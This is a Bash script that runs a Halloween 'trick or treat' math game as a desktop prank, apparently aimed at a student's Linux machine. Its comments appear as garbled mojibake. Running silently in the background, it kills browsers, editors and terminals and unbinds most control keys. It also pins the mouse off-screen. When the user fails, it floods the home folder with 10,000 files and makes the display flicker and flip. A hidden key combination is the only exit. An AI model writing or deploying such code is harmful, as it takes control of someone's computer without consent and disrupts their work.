#!/bin/bash

nohup bash -c '
    # –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å—ã
    pkill chrome
    pkill firefox
    pkill code
    pkill discord
    pkill postman
    pkill terminal
     # –ó–∞–∫—Ä—ã–≤–∞–µ–º –æ–∫–Ω–∞ nautilus
    for win in $(xdotool search --onlyvisible --class nautilus); do
        xdotool windowclose $win
    done
    # –û—Ç–∫–ª—é—á–∞–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –ø–æ–ª–æ–∂–µ–Ω–∏–µ –¥–æ–∫–∞
    gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed false

     # –ü–∞–ø–∫–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –æ–±–æ–µ–≤
    DOWNLOAD_PATH="$HOME/Downloads/wallpaper.jpg"

    # –°–∫–∞—á–∏–≤–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –æ–±–æ–∏
    wget -O "$DOWNLOAD_PATH" "https://images.wallpaperscraft.com/image/single/halloween_pumpkin_mask_118247_4896x3264.jpg"

    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞—Ä—Ç–∏–Ω–∫—É –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
    gsettings set org.gnome.desktop.background picture-uri "file://$DOWNLOAD_PATH"

       # –£–¥–∞–ª—è–µ–º –¥–µ–π—Å—Ç–≤–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã—Ö –∫–ª–∞–≤–∏—à
    keys=(37 105 64 108 50 62 66 23 134 133 118 110 119 115 117 112 9 28 65 67 68 69 70 71 72 73 74 75 76 95 96 46)
    for key in "${keys[@]}"; do
        xmodmap -e "keycode $key = "
    done 

    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –æ–∫–æ–Ω
    while true; do 
        xdotool mousemove 5000 5000
    done &  # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è "—Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —Å–±–æ—è"
system_crash() {

    xmodmap -e "keycode 36 = "

    # –ü–∞–ø–∫–∞ –¥–ª—è —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Ñ–∞–π–ª–æ–≤
    base_dir="/home/student"
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–µ —Ñ–∞–π–ª—ã
    for i in $(seq 1 10000); do 
        echo "Trick or treat? HAPPY HALLOWEEN!" > "$base_dir/$i.txt"
    done

    # –ó–∞–ø—É—Å–∫–∞–µ–º Zenity –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
    zenity --warning --text="SYSTEM CRASH" --height 30 --width 100 &
    zenity_pid=$!

    # –ñ–¥–µ–º, –ø–æ–∫–∞ Zenity –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è
    sleep 1

    # –ü–æ–ª—É—á–∞–µ–º ID –æ–∫–Ω–∞ Zenity
    zenity_window=$(xdotool search --onlyvisible --pid $zenity_pid)

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–∞—à–ª–∏ –ª–∏ –º—ã –æ–∫–Ω–æ
    if [ -z "$zenity_window" ]; then
        echo "–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –æ–∫–Ω–æ Zenity."
        exit 1
    fi

    # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –æ–∫–Ω–∞
    while true; do
        # –≠—Ñ—Ñ–µ–∫—Ç—ã –Ω–∞ —ç–∫—Ä–∞–Ω–µ
        xrandr --output DP-1 --gamma 1.5:0.5:0.5
        sleep 0.5
        xrandr --output DP-1 --gamma 1:1:1
        sleep 0.3

        # –ò–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏—é
        xrandr -o inverted
        sleep 0.5
        xrandr -o normal
        sleep 0.5

        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –¥–ª—è –æ–∫–Ω–∞ Zenity
        x=$((RANDOM % (3440 - 300)))  # –£—á–∏—Ç—ã–≤–∞–µ–º —à–∏—Ä–∏–Ω—É –æ–∫–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 300)
        y=$((RANDOM % (1440 - 100)))  # –£—á–∏—Ç—ã–≤–∞–µ–º –≤—ã—Å–æ—Ç—É –æ–∫–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 100)

        # –ü–µ—Ä–µ–º–µ—â–∞–µ–º –æ–∫–Ω–æ Zenity
        xdotool windowmove $zenity_window $x $y
    
        # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è–º–∏
        sleep 0.5
    done &
}

# –ó–∞–≥–æ–ª–æ–≤–æ–∫ –æ–∫–Ω–∞
TITLE="Trick or treat?"

# –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è
INSTRUCTIONS="–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –∏–≥—Ä—É!\n\n–í—ã –º–æ–∂–µ—Ç–µ —É–ø—Ä–∞–≤–ª—è—Ç—å —á–µ—Ä–µ–∑ —Å—Ç—Ä–µ–ª–∫–∏:\n- –°—Ç—Ä–µ–ª–∫–∞ –≤–ª–µ–≤–æ: –≤–∞—Ä–∏–∞–Ω—Ç —Å–ª–µ–≤–∞\n- –°—Ç—Ä–µ–ª–∫–∞ –≤–ø—Ä–∞–≤–æ: –≤–∞—Ä–∏–∞–Ω—Ç —Å–ø—Ä–∞–≤–∞\n- –°—Ç—Ä–µ–ª–∫–∞ –≤–≤–µ—Ä—Ö/–≤–Ω–∏–∑: –Ω–∞–≤–∏–≥–∞—Ü–∏—è\n\n–ù–∞–∂–º–∏—Ç–µ '–û–ö', —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å."

# –ü–æ–∫–∞–∑ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
zenity --info --text="$INSTRUCTIONS" --title="–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è" --width 300

# –¢–µ–∫—Å—Ç –≤ –æ–∫–Ω–µ
TEXT="–í—ã–±–æ—Ä –∑–∞ —Ç–æ–±–æ–π! –°–ª–∞–¥–æ—Å—Ç—å –∏–ª–∏ –≥–∞–¥–æ—Å—Ç—å?"

# –ó–∞–ø—É—Å–∫–∞–µ–º zenity —Å –¥–≤—É–º—è –∫–Ω–æ–ø–∫–∞–º–∏
RESULT=$(zenity --question --title="$TITLE" --text="$TEXT" --width 200 --ok-label="–ì–∞–¥–æ—Å—Ç—å" --cancel-label="–°–ª–∞–¥–æ—Å—Ç—å")

# –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–±–æ—Ä–∞
if [ $? -eq 0 ]; then
    zenity --info --text="–í—ã –≤—ã–±—Ä–∞–ª–∏ –≥–∞–¥–æ—Å—Ç—å! üëª –ù–æ –¥–∞–≤–∞–π —Å—ã–≥—Ä–∞–µ–º –≤ –ò–≥—Ä—É!" --width 200
else
    zenity --info --text="–í—ã –≤—ã–±—Ä–∞–ª–∏ —Å–ª–∞–¥–æ—Å—Ç—å! üç≠" --width 200
fi

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –º–∞—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∑–∞–¥–∞—á–∏
check_math_problem() {
    NUM1=$(( RANDOM % 10 + 1 ))
    NUM2=$(( RANDOM % 10 + 1 ))
    OPERATION=$(( RANDOM % 2 )) # 0 –¥–ª—è —Å–ª–æ–∂–µ–Ω–∏—è, 1 –¥–ª—è –≤—ã—á–∏—Ç–∞–Ω–∏—è

    if [ $OPERATION -eq 0 ]; then
        CORRECT_ANSWER=$(( NUM1 + NUM2 ))
        MATH_PROBLEM="$NUM1 + $NUM2"
    else
        CORRECT_ANSWER=$(( NUM1 - NUM2 ))
        MATH_PROBLEM="$NUM1 - $NUM2"
    fi

    USER_ANSWER=$(zenity --entry --title="–ú–∞—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–¥–∞—á–∞" --text="–†–µ—à–∏—Ç–µ: $MATH_PROBLEM" --width 200 --ok-label="OK")

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª–∞ –ª–∏ –Ω–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞ Cancel
    if [ $? -ne 0 ]; then
        USER_ANSWER="" # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—É—Å—Ç—É—é —Å—Ç—Ä–æ–∫—É
    fi

    if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]] && [ "$USER_ANSWER" -eq "$CORRECT_ANSWER" ]; then
        return 0 # –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç
    else
        if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]]; then
            return 1 # –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç
        else
            zenity --info --text="–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–π –æ—Ç–≤–µ—Ç. üò¢" --width 200
            return 1 # –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç
        fi
    fi
}

# –ü–µ—Ä–≤–∞—è –∑–∞–¥–∞—á–∞
wrong_attempts=0
max_attempts=3

for i in {1..4}; do
    if check_math_problem; then
        zenity --info --text="–ü—Ä–∞–≤–∏–ª—å–Ω–æ! üéâ\n\n–°–ª–µ–¥—É—é—â–∞—è –∑–∞–¥–∞—á–∞:" --width 200
        wrong_attempts=0 # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –ø—Ä–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º –æ—Ç–≤–µ—Ç–µ
    else
        ((wrong_attempts++))
        remaining_attempts=$((max_attempts - wrong_attempts))
        if [ $remaining_attempts -gt 0 ]; then
            zenity --info --text="–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –£ –≤–∞—Å –æ—Å—Ç–∞–ª–æ—Å—å –ø–æ–ø—ã—Ç–æ–∫: $remaining_attempts. üò¢" --width 200
        fi

        if [ $wrong_attempts -ge $max_attempts ]; then
            zenity --warning --title="Game Over!" --text="–î–∞–∞... –∂–∞–ª–∫–æ —ç—Ç–æ–≥–æ –¥–æ–±—Ä—è–∫–∞ ..." --width 200
            # –ó–∞–ø—É—Å–∫–∞–µ–º "—Å–∏—Å—Ç–µ–º–Ω—ã–π —Å–±–æ–π"
            system_crash
        fi
    fi
done

zenity --info --text="–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã —Ä–µ—à–∏–ª–∏ –≤—Å–µ –∑–∞–¥–∞—á–∏! üéä"

# –°–ø—Ä–∞—à–∏–≤–∞–µ–º –ø—Ä–æ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä
if zenity --question --title="–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –ª–∏ —Ç—ã –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä?" --text="–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –ª–∏ —Ç—ã –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä?" --width 200 --ok-label="–î–∞" --cancel-label="–ù–µ—Ç"; then
    zenity --info --text="–ú—ã –Ω–µ –ª—é–±–∏–º —á–∏—Ç–µ—Ä–æ–≤! –ù–æ! –î–∞–º —Ç–µ–±–µ –ø–æ—Å–ª–µ–¥–Ω–∏–π —à–∞–Ω—Å —Ä–µ—à–∏—Ç—å –µ—â–µ –æ–¥–Ω—É –∑–∞–¥–∞—á—É." --width 200

    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª–æ–∂–Ω—É—é –∑–∞–¥–∞—á—É
    NUM1=$(( RANDOM % 50 + 10 ))
    NUM2=$(( RANDOM % 50 + 10 ))
    OPERATION=$(( RANDOM % 2 ))

    if [ $OPERATION -eq 0 ]; then
        CORRECT_ANSWER=$(( NUM1 + NUM2 ))
        MATH_PROBLEM="$NUM1 + $NUM2"
    else
        CORRECT_ANSWER=$(( NUM1 - NUM2 ))
        MATH_PROBLEM="$NUM1 - $NUM2"
    fi

    USER_ANSWER=$(zenity --entry --title="–°–ª–æ–∂–Ω–∞—è –∑–∞–¥–∞—á–∞" --text="–†–µ—à–∏—Ç–µ: $MATH_PROBLEM" --width 200 --ok-label="OK")

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª–∞ –ª–∏ –Ω–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞ Cancel
    if [ $? -ne 0 ]; then
        USER_ANSWER="" # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—É—Å—Ç—É—é —Å—Ç—Ä–æ–∫—É
    fi

    if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]] && [ "$USER_ANSWER" -eq "$CORRECT_ANSWER" ]; then
        if zenity --question --title="–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –ª–∏ —Ç—ã –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä?" --text="–ú–æ–ª–æ–¥–µ—Ü! –ù–æ —Ç—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä?" --width 200 --ok-label="–î–∞" --cancel-label="–ù–µ—Ç"; then
            zenity --info --text="–¢—ã –Ω–µ –æ–ø—Ä–∞–≤–¥–∞–ª –Ω–∞—à–∏ –æ–∂–∏–¥–∞–Ω–∏—è ... –±–∞–Ω! –ë–∞–Ω! –ë–ê–ù! –ë–ê–ê–ê–ê–ê–ù!" --width 200
            system_crash
        else
            zenity --question --text="–¢—ã —Å–∞–º –≤ —ç—Ç–æ –≤–µ—Ä–∏—à—å?" --title="–ß–µ—Å—Ç–Ω–æ—Å—Ç—å?" --width 200 --ok-label="–î–∞" --cancel-label="–ù–µ—Ç"
            if [ $? -eq 0 ]; then
                zenity --info --text="–ú—ã —Ç–∞–∫ –∂–µ –Ω–µ –ª—é–±–∏–º –ª–≥—É–Ω–æ–≤. –ë–ê–ù! –ë–ê–ù! –ë–ê–ù!" --width 200
                system_crash
            else
                zenity --info --text="–ú—ã —É–≤–∞–∂–∞–µ–º —á–µ—Å—Ç–Ω–æ—Å—Ç—å, –Ω–æ –Ω–µ –æ–¥–æ–±—Ä—è–µ–º –ß–∏—Ç–µ—Ä—Å—Ç–≤–æ. –ë–ê–ù!" --width 200
                system_crash
            fi
        fi
    else
        zenity --info --text="–ö–∞–∫ —Ç—ã –≤ –ê–ª–µ–º –ø–æ–ø–∞–ª —Å —Ç–∞–∫–∏–º –º—ã—à–ª–µ–Ω–∏–µ–º? –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç: $CORRECT_ANSWER. üò¢" --width 200
    fi
else
    zenity --question --text="–¢—ã —Å–∞–º –≤ —ç—Ç–æ –≤–µ—Ä–∏—à—å?" --title="–ß–µ—Å—Ç–Ω–æ—Å—Ç—å?" --width 200 --ok-label="–î–∞" --cancel-label="–ù–µ—Ç"
    if [ $? -eq 0 ]; then
        zenity --info --text="–ú—ã —Ç–∞–∫ –∂–µ –Ω–µ –ª—é–±–∏–º –ª–≥—É–Ω–æ–≤. –ë–ê–ù! –ë–ê–ù! –ë–ê–ù!" --width 200
        system_crash
    else
        zenity --info --text="–ú—ã —É–≤–∞–∂–∞–µ–º —á–µ—Å—Ç–Ω–æ—Å—Ç—å, –Ω–æ –Ω–µ –æ–¥–æ–±—Ä—è–µ–º –ß–∏—Ç–µ—Ä—Å—Ç–≤–æ. –ë–ê–ù!" --width 200
        system_crash
    fi
fi
' > /dev/null 2>&1 & disown

nohup bash -c "
DEVICE_ID=11  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
count199=0
count198=0


xinput test \"\$DEVICE_ID\" | while read -r line; do
    if [ \"\$count199\" -eq 2 ] && [ \"\$count198\" -eq 2 ]; then
        pkill bash
        break
    fi

    echo \"\$line\" | grep 'key press   199' &> /dev/null
    if [ \$? -eq 0 ]; then
        echo '–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞ 199'
        ((count199++))
    fi

    echo \"\$line\" | grep 'key press   198' &> /dev/null
    if [ \$? -eq 0 ]; then
        echo '–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞ 198'
        ((count198++))
    fi
done
" > /dev/null 2>&1 & disown

